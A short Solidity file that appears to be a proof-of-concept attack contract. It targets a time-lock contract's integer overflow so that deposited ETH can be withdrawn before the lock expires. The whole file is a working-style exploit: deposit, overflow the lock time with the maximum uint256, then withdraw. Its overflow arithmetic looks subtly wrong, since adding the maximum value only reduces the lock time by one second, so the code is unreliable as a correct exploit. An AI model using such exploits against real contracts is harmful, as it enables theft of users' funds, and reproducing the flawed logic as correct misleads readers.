pragma solidity ^0.4.10;

interface ITimeLock {
    function deposit() external payable;
    function increaseLockTime(uint _secondsToIncrease) external;
    function withdraw() external;
}

contract AttackTimeLock {
    ITimeLock public timeLock;

    constructor(address _timeLockAddress) public {
        timeLock = ITimeLock(_timeLockAddress);
    }

    function attack() public payable {
        // Step 1: Deposit ETH
        timeLock.deposit.value(msg.value)();

        // Step 2: Cause overflow in lockTime by increasing it with max uint
        uint overflowValue = 2**256 - 1; // Max uint256 value
        timeLock.increaseLockTime(overflowValue);

        // Step 3: Immediately withdraw funds
        timeLock.withdraw();
    }

    // Helper to receive ETH from withdraw
    function() public payable {}
}

